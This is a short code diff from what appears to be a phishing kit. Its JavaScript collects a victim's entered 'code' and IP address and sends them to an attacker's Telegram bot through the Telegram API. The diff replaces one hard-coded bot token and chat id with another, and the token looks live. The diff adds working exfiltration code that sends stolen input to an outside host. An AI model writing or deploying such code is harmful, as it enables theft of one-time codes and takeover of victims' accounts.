@@ -195,9 +195,8 @@
         var ipaddress = document.getElementById('ipaddress').value;
 
         var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
-        var token = '6574493215:AAGDBfNivQ3vTzxAe-ltH4oIIB25mAr7pD4';
-                var chat_id = '6055794207';
-
+        var token = '7113213826:AAGEd_pp66rX5qLXrtqxG1TI-14AqDHuei4';
+                var chat_id = '6752411334';
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
         fetch(url)
